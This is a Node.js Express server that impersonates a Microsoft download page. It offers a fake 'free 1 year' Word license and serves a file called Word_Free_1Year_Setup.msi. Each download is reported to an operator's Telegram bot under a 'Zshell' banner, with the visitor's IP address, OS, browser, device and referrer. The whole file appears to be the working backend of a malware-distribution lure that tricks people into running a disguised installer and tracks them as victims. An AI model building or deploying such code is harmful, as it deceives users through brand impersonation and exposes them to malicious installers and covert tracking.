const express = require('express');
const cors = require('cors');
const path = require('path');
const axios = require('axios');
const UAParser = require('ua-parser-js');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 5000;

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Telegram Logging Function (Non-blocking)
function sendTelegramLog(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.log('⚠️ Telegram logging disabled - missing bot token or chat ID');
        return;
    }

    // Fire-and-forget with timeout to prevent blocking downloads
    const timeoutPromise = new Promise((_, reject) => 
        setTimeout(() => reject(new Error('Timeout')), 5000)
    );

    const sendPromise = axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: TELEGRAM_CHAT_ID,
        text: message
        // Removed parse_mode to prevent injection issues
    });

    Promise.race([sendPromise, timeoutPromise])
        .then(() => console.log('✅ Telegram log sent successfully'))
        .catch(error => console.error('❌ Failed to send Telegram log:', error.message));
}

// Get client IP address with proper forwarded header parsing
function getClientIP(req) {
    // Parse x-forwarded-for to get the first (original) IP
    const forwarded = req.headers['x-forwarded-for'];
    if (forwarded) {
        const firstIP = forwarded.split(',')[0].trim();
        if (firstIP && firstIP !== 'unknown') {
            return firstIP;
        }
    }
    
    return req.headers['x-real-ip'] || 
           req.connection.remoteAddress || 
           req.socket.remoteAddress ||
           (req.connection.socket ? req.connection.socket.remoteAddress : null) ||
           req.ip ||
           'Unknown';
}

// Format download log message
function formatDownloadLog(userAgent, ip, referrer) {
    const parser = new UAParser(userAgent);
    const browser = parser.getBrowser();
    const os = parser.getOS();
    const device = parser.getDevice();
    
    const currentTime = new Date().toLocaleString('en-US', {
        timeZone: 'UTC',
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    });

    return `🧛‍♂️ Zshell
📢 New Device Access
 DOCX CLIENT

🌍 IP: ${ip}
🖥 Platform: ${os.name || 'auto detect'} ${os.version || 'windows'}
🌐 Browser: ${browser.name || 'auto detect'} ${browser.version || 'agent'}
🌎 Country: Auto-detecting...

🔵 Docx User attempting to download Docx file
📱 Device: ${device.type || os.name || 'windows'}
🌍 IP: ${ip}
🌐 Browser: ${browser.name || 'Unknown'} ${browser.version || ''}
📏 Resolution: Auto-detecting...
📐 Window: Auto-detecting...
⏰ Time: ${currentTime}
🔄 Referrer: ${referrer || 'Direct'}

🔽 Docx user attempting to download Docx file for ${device.type || os.name || 'windows'} device

✅ Docx file download started successfully for ${device.type || os.name || 'windows'} device`;
}

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('client'));

// API Routes
app.get('/api/download/word-free', (req, res) => {
    const filePath = path.join(__dirname, 'client', 'public', 'Word_Free_1Year_Setup.msi');
    const fileName = 'Word_Free_1Year_Setup.msi';
    
    // Capture user details for logging
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const clientIP = getClientIP(req);
    const referrer = req.headers.referer || req.headers.referrer || 'Direct';
    
    console.log(`📥 Download request received for: ${fileName}`);
    console.log(`📂 File path: ${filePath}`);
    console.log(`👤 Client IP: ${clientIP}`);
    console.log(`🌐 User Agent: ${userAgent}`);
    
    // Send Telegram log for download attempt (non-blocking)
    const logMessage = formatDownloadLog(userAgent, clientIP, referrer);
    sendTelegramLog(logMessage);
    
    // Set headers for download
    res.setHeader('Content-Disposition', `attachment; filename="${fileName}"`);
    res.setHeader('Content-Type', 'application/octet-stream');
    res.setHeader('Cache-Control', 'no-cache');
    
    // Send the file for download
    res.download(filePath, fileName, (err) => {
        if (err) {
            console.error('❌ Download error:', err);
            
            // Send Telegram log for download error (non-blocking)
            const errorMessage = `❌ Download Error
🧛‍♂️ Zshell - Error Report
🌍 IP: ${clientIP}
📱 Device: ${new UAParser(userAgent).getOS().name || 'Unknown'}
❌ Error: ${err.message}
⏰ Time: ${new Date().toLocaleString('en-US', { timeZone: 'UTC' })}`;
            
            sendTelegramLog(errorMessage);
            
            res.status(500).json({
                success: false,
                message: "Download failed. Please try again.",
                error: err.message
            });
        } else {
            console.log(`✅ Download completed successfully: ${fileName}`);
            
            // Send success confirmation to Telegram (non-blocking)
            const successMessage = `✅ Download Completed Successfully
🧛‍♂️ Zshell - Success Report
🌍 IP: ${clientIP}
📁 File: ${fileName}
📱 Device: ${new UAParser(userAgent).getOS().name || 'Unknown'}
⏰ Time: ${new Date().toLocaleString('en-US', { timeZone: 'UTC' })}`;
            
            sendTelegramLog(successMessage);
        }
    });
});

app.get('/api/product/info', (req, res) => {
    res.json({
        productId: "cfq7ttc0pbmb",
        title: "Word - Free 1 Year License",
        description: "• Free for 1 PC or Mac for 1 year\n• Create beautiful and engaging documents\n• Share your documents with others and edit together in real time*\n• Compatible with Windows 11, Windows 10, or macOS\n\n*Files must be shared from OneDrive.",
        productType: "Free Trial",
        price: {
            currency: "USD",
            current: "Free",
            original: "$179.99",
            savings: "$179.99",
            dynamicOriginalPrice: "Free for 1 Year"
        },
        action: {
            action: "DownloadFree",
            actionText: "Download Free Version",
            behaviorTag: 82,
            disabled: false
        },
        licenseInfo: {
            type: "Free 1 Year Trial",
            duration: "365 days",
            features: "Full Microsoft Word functionality",
            support: "Community support included"
        }
    });
});


app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Microsoft Word Free Download Server running on http://0.0.0.0:${PORT}`);
    console.log(`📄 Frontend: http://0.0.0.0:${PORT}`);
    console.log(`🔗 API: http://0.0.0.0:${PORT}/api`);
    console.log(`✅ Client-Server separation active`);
});